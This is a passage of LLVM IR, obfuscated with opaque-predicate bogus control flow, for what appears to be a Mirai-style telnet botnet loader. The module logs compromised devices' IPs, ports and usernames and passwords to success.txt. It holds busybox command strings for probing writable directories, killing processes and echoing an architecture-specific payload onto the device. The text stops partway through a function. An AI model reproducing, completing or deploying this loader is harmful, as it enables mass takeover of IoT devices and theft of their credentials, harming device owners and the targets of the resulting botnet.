; ModuleID = 'host/ir_bcf/Sythe.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.connection = type { %union.pthread_mutex_t, %struct.server*, %struct.binary*, %struct.telnet_info, i32, i32, i64, i32, %struct.anon, i16, i16, i8, i8, i8, i8, [8192 x i8] }
%union.pthread_mutex_t = type { %struct.__pthread_mutex_s }
%struct.__pthread_mutex_s = type { i32, i32, i32, i32, i32, i16, i16, %struct.__pthread_internal_list }
%struct.__pthread_internal_list = type { %struct.__pthread_internal_list*, %struct.__pthread_internal_list* }
%struct.server = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i8*, i8*, %struct.server_worker*, %struct.connection**, i32*, i64, i16, i8, i8, i32 }
%struct.server_worker = type { %struct.server*, i32, i64, i8 }
%struct.binary = type { [6 x i8], i32, i8** }
%struct.telnet_info = type { [32 x i8], [32 x i8], [6 x i8], [32 x i8], i32, i16, i32, i8, i8 }
%struct.anon = type { [512 x i8], i32 }
%struct.elf_hdr = type { [16 x i8], i16, i16, i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }

@fileeeee = common global %struct._IO_FILE* null, align 8
@.str = private unnamed_addr constant [13 x i8] c"srv == NULL\0A\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.1 = private unnamed_addr constant [42 x i8] c"Payload Sent --> %d.%d.%d.%d:%d %s:%s %s\0A\00", align 1
@.str.2 = private unnamed_addr constant [12 x i8] c"success.txt\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.4 = private unnamed_addr constant [22 x i8] c"%d.%d.%d.%d:%d %s:%s\0A\00", align 1
@connection_consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@connection_consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"enter\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@.str.8 = private unnamed_addr constant [24 x i8] c"ECCHI: applet not found\00", align 1
@.str.9 = private unnamed_addr constant [5 x i8] c"init\00", align 1
@.str.10 = private unnamed_addr constant [7 x i8] c"[init]\00", align 1
@.str.11 = private unnamed_addr constant [26 x i8] c"/bin/busybox kill -9 %d\0D\0A\00", align 1
@.str.12 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.13 = private unnamed_addr constant [3 x i8] c"rw\00", align 1
@.str.14 = private unnamed_addr constant [100 x i8] c"/bin/busybox echo -e '%s%s' > %s/.nippon; /bin/busybox cat %s/.nippon; /bin/busybox rm %s/.nippon\0D\0A\00", align 1
@.str.15 = private unnamed_addr constant [17 x i8] c"\5Cx6b\5Cx61\5Cx6d\5Cx69\00", align 1
@.str.16 = private unnamed_addr constant [108 x i8] c"/bin/busybox echo -e '%s/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon\0D\0A\00", align 1
@.str.17 = private unnamed_addr constant [21 x i8] c"/bin/busybox ECCHI\0D\0A\00", align 1
@.str.18 = private unnamed_addr constant [5 x i8] c"kami\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.20 = private unnamed_addr constant [36 x i8] c"rm %s/.t; rm %s/.sh; rm %s/.human\0D\0A\00", align 1
@.str.21 = private unnamed_addr constant [4 x i8] c"ELF\00", align 1
@.str.22 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@.str.23 = private unnamed_addr constant [5 x i8] c"mpsl\00", align 1
@.str.24 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.25 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.26 = private unnamed_addr constant [4 x i8] c"spc\00", align 1
@.str.27 = private unnamed_addr constant [5 x i8] c"m68k\00", align 1
@.str.28 = private unnamed_addr constant [4 x i8] c"ppc\00", align 1
@.str.29 = private unnamed_addr constant [4 x i8] c"sh4\00", align 1
@.str.30 = private unnamed_addr constant [6 x i8] c"ARMv7\00", align 1
@.str.31 = private unnamed_addr constant [6 x i8] c"ARMv6\00", align 1
@.str.32 = private unnamed_addr constant [5 x i8] c"arm7\00", align 1
@.str.33 = private unnamed_addr constant [23 x i8] c"wget: applet not found\00", align 1
@.str.34 = private unnamed_addr constant [23 x i8] c"tftp: applet not found\00", align 1
@.str.36 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.37 = private unnamed_addr constant [3 x i8] c">>\00", align 1
@.str.35 = private unnamed_addr constant [44 x i8] c"echo -ne '%s' %s upnp; /bin/busybox ECCHI\0D\0A\00", align 1
@.str.38 = private unnamed_addr constant [18 x i8] c"Permission denied\00", align 1
@.str.39 = private unnamed_addr constant [8 x i8] c"timeout\00", align 1
@.str.40 = private unnamed_addr constant [15 x i8] c"illegal option\00", align 1
@.str.41 = private unnamed_addr constant [24 x i8] c"IHCCE: applet not found\00", align 1
@.str.42 = private unnamed_addr constant [15 x i8] c"listening tun0\00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define void @connection_open(%struct.connection*) #0 {
  %2 = alloca %struct.connection*, align 8
  store %struct.connection* %0, %struct.connection** %2, align 8
  %3 = load %struct.connection*, %struct.connection** %2, align 8
  %4 = getelementptr inbounds %struct.connection, %struct.connection* %3, i32 0, i32 0
  %5 = call i32 @pthread_mutex_lock(%union.pthread_mutex_t* %4) #5
  %6 = load %struct.connection*, %struct.connection** %2, align 8
  %7 = getelementptr inbounds %struct.connection, %struct.connection* %6, i32 0, i32 9
  store i16 0, i16* %7, align 8
  %8 = call i64 @time(i64* null) #5
  %9 = load %struct.connection*, %struct.connection** %2, align 8
  %10 = getelementptr inbounds %struct.connection, %struct.connection* %9, i32 0, i32 6
  store i64 %8, i64* %10, align 8
  %11 = load %struct.connection*, %struct.connection** %2, align 8
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %11, i32 0, i32 10
  store i16 10, i16* %12, align 2
  %13 = load %struct.connection*, %struct.connection** %2, align 8
  %14 = getelementptr inbounds %struct.connection, %struct.connection* %13, i32 0, i32 5
  store i32 0, i32* %14, align 4
  %15 = load %struct.connection*, %struct.connection** %2, align 8
  %16 = getelementptr inbounds %struct.connection, %struct.connection* %15, i32 0, i32 7
  store i32 1, i32* %16, align 8
  %17 = load %struct.connection*, %struct.connection** %2, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 12
  store i8 0, i8* %18, align 1
  %19 = load %struct.connection*, %struct.connection** %2, align 8
  %20 = getelementptr inbounds %struct.connection, %struct.connection* %19, i32 0, i32 11
  store i8 1, i8* %20, align 4
  %21 = load %struct.connection*, %struct.connection** %2, align 8
  %22 = getelementptr inbounds %struct.connection, %struct.connection* %21, i32 0, i32 2
  store %struct.binary* null, %struct.binary** %22, align 8
  %23 = load %struct.connection*, %struct.connection** %2, align 8
  %24 = getelementptr inbounds %struct.connection, %struct.connection* %23, i32 0, i32 5
  store i32 0, i32* %24, align 4
  %25 = load %struct.connection*, %struct.connection** %2, align 8
  %26 = getelementptr inbounds %struct.connection, %struct.connection* %25, i32 0, i32 0
  %27 = call i32 @pthread_mutex_unlock(%union.pthread_mutex_t* %26) #5
  ret void
}

; Function Attrs: nounwind
declare i32 @pthread_mutex_lock(%union.pthread_mutex_t*) #1

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @pthread_mutex_unlock(%union.pthread_mutex_t*) #1

; Function Attrs: noinline nounwind uwtable
define void @connection_close(%struct.connection*) #0 {
  %2 = alloca %struct.connection*, align 8
  store %struct.connection* %0, %struct.connection** %2, align 8
  %3 = load %struct.connection*, %struct.connection** %2, align 8
  %4 = getelementptr inbounds %struct.connection, %struct.connection* %3, i32 0, i32 0
  %5 = call i32 @pthread_mutex_lock(%union.pthread_mutex_t* %4) #5
  %6 = load %struct.connection*, %struct.connection** %2, align 8
  %7 = getelementptr inbounds %struct.connection, %struct.connection* %6, i32 0, i32 11
  %8 = load i8, i8* %7, align 4
  %9 = icmp ne i8 %8, 0
  br i1 %9, label %10, label %156

; <label>:10:                                     ; preds = %1
  %11 = load %struct.connection*, %struct.connection** %2, align 8
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %11, i32 0, i32 8
  %13 = getelementptr inbounds %struct.anon, %struct.anon* %12, i32 0, i32 0
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %13, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 512, i32 4, i1 false)
  %15 = load %struct.connection*, %struct.connection** %2, align 8
  %16 = getelementptr inbounds %struct.connection, %struct.connection* %15, i32 0, i32 8
  %17 = getelementptr inbounds %struct.anon, %struct.anon* %16, i32 0, i32 1
  store i32 0, i32* %17, align 4
  %18 = load %struct.connection*, %struct.connection** %2, align 8
  %19 = getelementptr inbounds %struct.connection, %struct.connection* %18, i32 0, i32 6
  store i64 0, i64* %19, align 8
  %20 = load %struct.connection*, %struct.connection** %2, align 8
  %21 = getelementptr inbounds %struct.connection, %struct.connection* %20, i32 0, i32 11
  store i8 0, i8* %21, align 4
  %22 = load %struct.connection*, %struct.connection** %2, align 8
  %23 = getelementptr inbounds %struct.connection, %struct.connection* %22, i32 0, i32 13
  store i8 0, i8* %23, align 2
  %24 = load %struct.connection*, %struct.connection** %2, align 8
  %25 = getelementptr inbounds %struct.connection, %struct.connection* %24, i32 0, i32 14
  store i8 0, i8* %25, align 1
  %26 = load %struct.connection*, %struct.connection** %2, align 8
  %27 = getelementptr inbounds %struct.connection, %struct.connection* %26, i32 0, i32 15
  %28 = getelementptr inbounds [8192 x i8], [8192 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 8192, i32 8, i1 false)
  %29 = load %struct.connection*, %struct.connection** %2, align 8
  %30 = getelementptr inbounds %struct.connection, %struct.connection* %29, i32 0, i32 9
  store i16 0, i16* %30, align 8
  %31 = load %struct.connection*, %struct.connection** %2, align 8
  %32 = getelementptr inbounds %struct.connection, %struct.connection* %31, i32 0, i32 1
  %33 = load %struct.server*, %struct.server** %32, align 8
  %34 = icmp eq %struct.server* %33, null
  br i1 %34, label %35, label %37

; <label>:35:                                     ; preds = %10
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i32 0, i32 0))
  br label %179

; <label>:37:                                     ; preds = %10
  %38 = load %struct.connection*, %struct.connection** %2, align 8
  %39 = getelementptr inbounds %struct.connection, %struct.connection* %38, i32 0, i32 12
  %40 = load i8, i8* %39, align 1
  %41 = icmp ne i8 %40, 0
  br i1 %41, label %42, label %133

; <label>:42:                                     ; preds = %37
  %43 = load %struct.connection*, %struct.connection** %2, align 8
  %44 = getelementptr inbounds %struct.connection, %struct.connection* %43, i32 0, i32 1
  %45 = load %struct.server*, %struct.server** %44, align 8
  %46 = getelementptr inbounds %struct.server, %struct.server* %45, i32 0, i32 7
  %47 = atomicrmw add i32* %46, i32 1 seq_cst
  %48 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %49 = load %struct.connection*, %struct.connection** %2, align 8
  %50 = getelementptr inbounds %struct.connection, %struct.connection* %49, i32 0, i32 3
  %51 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %50, i32 0, i32 4
  %52 = load i32, i32* %51, align 8
  %53 = and i32 %52, 255
  %54 = load %struct.connection*, %struct.connection** %2, align 8
  %55 = getelementptr inbounds %struct.connection, %struct.connection* %54, i32 0, i32 3
  %56 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %55, i32 0, i32 4
  %57 = load i32, i32* %56, align 8
  %58 = lshr i32 %57, 8
  %59 = and i32 %58, 255
  %60 = load %struct.connection*, %struct.connection** %2, align 8
  %61 = getelementptr inbounds %struct.connection, %struct.connection* %60, i32 0, i32 3
  %62 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %61, i32 0, i32 4
  %63 = load i32, i32* %62, align 8
  %64 = lshr i32 %63, 16
  %65 = and i32 %64, 255
  %66 = load %struct.connection*, %struct.connection** %2, align 8
  %67 = getelementptr inbounds %struct.connection, %struct.connection* %66, i32 0, i32 3
  %68 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %67, i32 0, i32 4
  %69 = load i32, i32* %68, align 8
  %70 = lshr i32 %69, 24
  %71 = and i32 %70, 255
  %72 = load %struct.connection*, %struct.connection** %2, align 8
  %73 = getelementptr inbounds %struct.connection, %struct.connection* %72, i32 0, i32 3
  %74 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %73, i32 0, i32 5
  %75 = load i16, i16* %74, align 4
  %76 = zext i16 %75 to i32
  %77 = call i32 (i32, ...) bitcast (i32 (...)* @ntohs to i32 (i32, ...)*)(i32 %76)
  %78 = load %struct.connection*, %struct.connection** %2, align 8
  %79 = getelementptr inbounds %struct.connection, %struct.connection* %78, i32 0, i32 3
  %80 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %79, i32 0, i32 0
  %81 = getelementptr inbounds [32 x i8], [32 x i8]* %80, i32 0, i32 0
  %82 = load %struct.connection*, %struct.connection** %2, align 8
  %83 = getelementptr inbounds %struct.connection, %struct.connection* %82, i32 0, i32 3
  %84 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %83, i32 0, i32 1
  %85 = getelementptr inbounds [32 x i8], [32 x i8]* %84, i32 0, i32 0
  %86 = load %struct.connection*, %struct.connection** %2, align 8
  %87 = getelementptr inbounds %struct.connection, %struct.connection* %86, i32 0, i32 3
  %88 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %87, i32 0, i32 2
  %89 = getelementptr inbounds [6 x i8], [6 x i8]* %88, i32 0, i32 0
  %90 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %48, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.1, i32 0, i32 0), i32 %53, i32 %59, i32 %65, i32 %71, i32 %77, i8* %81, i8* %85, i8* %89)
  %91 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i32 0, i32 0))
  store %struct._IO_FILE* %91, %struct._IO_FILE** @fileeeee, align 8
  %92 = load %struct._IO_FILE*, %struct._IO_FILE** @fileeeee, align 8
  %93 = load %struct.connection*, %struct.connection** %2, align 8
  %94 = getelementptr inbounds %struct.connection, %struct.connection* %93, i32 0, i32 3
  %95 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %94, i32 0, i32 4
  %96 = load i32, i32* %95, align 8
  %97 = and i32 %96, 255
  %98 = load %struct.connection*, %struct.connection** %2, align 8
  %99 = getelementptr inbounds %struct.connection, %struct.connection* %98, i32 0, i32 3
  %100 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %99, i32 0, i32 4
  %101 = load i32, i32* %100, align 8
  %102 = lshr i32 %101, 8
  %103 = and i32 %102, 255
  %104 = load %struct.connection*, %struct.connection** %2, align 8
  %105 = getelementptr inbounds %struct.connection, %struct.connection* %104, i32 0, i32 3
  %106 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %105, i32 0, i32 4
  %107 = load i32, i32* %106, align 8
  %108 = lshr i32 %107, 16
  %109 = and i32 %108, 255
  %110 = load %struct.connection*, %struct.connection** %2, align 8
  %111 = getelementptr inbounds %struct.connection, %struct.connection* %110, i32 0, i32 3
  %112 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %111, i32 0, i32 4
  %113 = load i32, i32* %112, align 8
  %114 = lshr i32 %113, 24
  %115 = and i32 %114, 255
  %116 = load %struct.connection*, %struct.connection** %2, align 8
  %117 = getelementptr inbounds %struct.connection, %struct.connection* %116, i32 0, i32 3
  %118 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %117, i32 0, i32 5
  %119 = load i16, i16* %118, align 4
  %120 = zext i16 %119 to i32
  %121 = call i32 (i32, ...) bitcast (i32 (...)* @ntohs to i32 (i32, ...)*)(i32 %120)
  %122 = load %struct.connection*, %struct.connection** %2, align 8
  %123 = getelementptr inbounds %struct.connection, %struct.connection* %122, i32 0, i32 3
  %124 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %123, i32 0, i32 0
  %125 = getelementptr inbounds [32 x i8], [32 x i8]* %124, i32 0, i32 0
  %126 = load %struct.connection*, %struct.connection** %2, align 8
  %127 = getelementptr inbounds %struct.connection, %struct.connection* %126, i32 0, i32 3
  %128 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %127, i32 0, i32 1
  %129 = getelementptr inbounds [32 x i8], [32 x i8]* %128, i32 0, i32 0
  %130 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %92, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i32 0, i32 0), i32 %97, i32 %103, i32 %109, i32 %115, i32 %121, i8* %125, i8* %129)
  %131 = load %struct._IO_FILE*, %struct._IO_FILE** @fileeeee, align 8
  %132 = call i32 @fclose(%struct._IO_FILE* %131)
  br label %139

; <label>:133:                                    ; preds = %37
  %134 = load %struct.connection*, %struct.connection** %2, align 8
  %135 = getelementptr inbounds %struct.connection, %struct.connection* %134, i32 0, i32 1
  %136 = load %struct.server*, %struct.server** %135, align 8
  %137 = getelementptr inbounds %struct.server, %struct.server* %136, i32 0, i32 8
  %138 = atomicrmw add i32* %137, i32 1 seq_cst
  br label %139

; <label>:139:                                    ; preds = %133, %42
  %140 = load i32, i32* @x.1
  %141 = load i32, i32* @y.2
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %139
  %148 = load i32, i32* @x.1
  %149 = load i32, i32* @y.2
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %156

; <label>:156:                                    ; preds = %originalBBpart2, %1
  %157 = load %struct.connection*, %struct.connection** %2, align 8
  %158 = getelementptr inbounds %struct.connection, %struct.connection* %157, i32 0, i32 7
  store i32 0, i32* %158, align 8
  %159 = load %struct.connection*, %struct.connection** %2, align 8
  %160 = getelementptr inbounds %struct.connection, %struct.connection* %159, i32 0, i32 4
  %161 = load i32, i32* %160, align 8
  %162 = icmp ne i32 %161, -1
  br i1 %162, label %163, label %175

; <label>:163:                                    ; preds = %156
  %164 = load %struct.connection*, %struct.connection** %2, align 8
  %165 = getelementptr inbounds %struct.connection, %struct.connection* %164, i32 0, i32 4
  %166 = load i32, i32* %165, align 8
  %167 = call i32 (i32, ...) bitcast (i32 (...)* @close to i32 (i32, ...)*)(i32 %166)
  %168 = load %struct.connection*, %struct.connection** %2, align 8
  %169 = getelementptr inbounds %struct.connection, %struct.connection* %168, i32 0, i32 4
  store i32 -1, i32* %169, align 8
  %170 = load %struct.connection*, %struct.connection** %2, align 8
  %171 = getelementptr inbounds %struct.connection, %struct.connection* %170, i32 0, i32 1
  %172 = load %struct.server*, %struct.server** %171, align 8
  %173 = getelementptr inbounds %struct.server, %struct.server* %172, i32 0, i32 1
  %174 = atomicrmw sub i32* %173, i32 1 seq_cst
  br label %175

; <label>:175:                                    ; preds = %163, %156
  %176 = load %struct.connection*, %struct.connection** %2, align 8
  %177 = getelementptr inbounds %struct.connection, %struct.connection* %176, i32 0, i32 0
  %178 = call i32 @pthread_mutex_unlock(%union.pthread_mutex_t* %177) #5
  br label %179

; <label>:179:                                    ; preds = %175, %35
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %139
  br label %originalBB
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #2

declare i32 @printf(i8*, ...) #3

declare i32 @ntohs(...) #3

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #3

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

declare i32 @fclose(%struct._IO_FILE*) #3

declare i32 @close(...) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_iacs(%struct.connection*) #0 {
  %2 = alloca %struct.connection*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [3 x i8], align 1
  %7 = alloca [9 x i8], align 1
  store %struct.connection* %0, %struct.connection** %2, align 8
  store i32 0, i32* %3, align 4
  %8 = load %struct.connection*, %struct.connection** %2, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 15
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  store i8* %10, i8** %4, align 8
  br label %11

; <label>:11:                                     ; preds = %281, %121, %1
  %12 = load i32, i32* @x.3
  %13 = load i32, i32* @y.4
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %11
  %20 = load i32, i32* %3, align 4
  %21 = load %struct.connection*, %struct.connection** %2, align 8
  %22 = getelementptr inbounds %struct.connection, %struct.connection* %21, i32 0, i32 9
  %23 = load i16, i16* %22, align 8
  %24 = zext i16 %23 to i32
  %25 = icmp slt i32 %20, %24
  %26 = load i32, i32* @x.3
  %27 = load i32, i32* @y.4
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %25, label %34, label %282

; <label>:34:                                     ; preds = %originalBBpart2
  %35 = load i32, i32* @x.3
  %36 = load i32, i32* @y.4
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %34
  %43 = load i8*, i8** %4, align 8
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp ne i32 %45, 255
  %47 = load i32, i32* @x.3
  %48 = load i32, i32* @y.4
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %46, label %55, label %72

; <label>:55:                                     ; preds = %originalBBpart24
  %56 = load i32, i32* @x.3
  %57 = load i32, i32* @y.4
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %55
  %64 = load i32, i32* @x.3
  %65 = load i32, i32* @y.4
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %282

; <label>:72:                                     ; preds = %originalBBpart24
  %73 = load i32, i32* @x.3
  %74 = load i32, i32* @y.4
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %72
  %81 = load i8*, i8** %4, align 8
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 255
  %85 = load i32, i32* @x.3
  %86 = load i32, i32* @y.4
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %84, label %93, label %280

; <label>:93:                                     ; preds = %originalBBpart212
  %94 = load %struct.connection*, %struct.connection** %2, align 8
  %95 = load i8*, i8** %4, align 8
  %96 = call signext i8 @can_consume(%struct.connection* %94, i8* %95, i32 1)
  %97 = icmp ne i8 %96, 0
  br i1 %97, label %115, label %98

; <label>:98:                                     ; preds = %93
  %99 = load i32, i32* @x.3
  %100 = load i32, i32* @y.4
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %98
  %107 = load i32, i32* @x.3
  %108 = load i32, i32* @y.4
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %282

; <label>:115:                                    ; preds = %93
  %116 = load i8*, i8** %4, align 8
  %117 = getelementptr inbounds i8, i8* %116, i64 1
  %118 = load i8, i8* %117, align 1
  %119 = zext i8 %118 to i32
  %120 = icmp eq i32 %119, 255
  br i1 %120, label %121, label %126

; <label>:121:                                    ; preds = %115
  %122 = load i8*, i8** %4, align 8
  %123 = getelementptr inbounds i8, i8* %122, i64 2
  store i8* %123, i8** %4, align 8
  %124 = load i32, i32* %3, align 4
  %125 = add nsw i32 %124, 2
  store i32 %125, i32* %3, align 4
  br label %11

; <label>:126:                                    ; preds = %115
  %127 = load i32, i32* @x.3
  %128 = load i32, i32* @y.4
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %126
  %135 = load i8*, i8** %4, align 8
  %136 = getelementptr inbounds i8, i8* %135, i64 1
  %137 = load i8, i8* %136, align 1
  %138 = zext i8 %137 to i32
  %139 = icmp eq i32 %138, 253
  %140 = load i32, i32* @x.3
  %141 = load i32, i32* @y.4
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %139, label %148, label %210

; <label>:148:                                    ; preds = %originalBBpart220
  %149 = bitcast [3 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %149, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @connection_consume_iacs.tmp1, i32 0, i32 0), i64 3, i32 1, i1 false)
  %150 = bitcast [9 x i8]* %7 to i8*
